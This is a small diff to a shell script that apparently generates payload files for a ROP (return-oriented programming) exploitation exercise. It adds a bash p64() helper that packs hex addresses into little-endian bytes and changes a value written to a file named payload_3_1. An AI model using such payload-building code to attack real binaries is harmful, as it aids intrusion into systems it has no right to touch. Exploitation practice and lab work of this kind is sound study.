@@ -38,7 +38,24 @@ ROPGadgets
 Values
 
 
-v18="1"
+p64() {
+    # Remove the '0x' prefix if present
+    local hex=${1#0x}
+    # Pad the hex string to ensure it's 16 characters, 8 bytes long
+    while [ ${#hex} -lt 16 ]; do
+        hex="0$hex"
+    done
+    # Reverse the bytes and format as a little-endian string
+    local le=""
+    for (( i=0; i<${#hex}; i+=2 )); do
+        le="\\x${hex:$i:2}$le"
+    done
+    # Echo the result
+    echo -ne "$le"
+}
+
+
+v18="3"
 
 echo -ne $v18 > payload_3_1
 
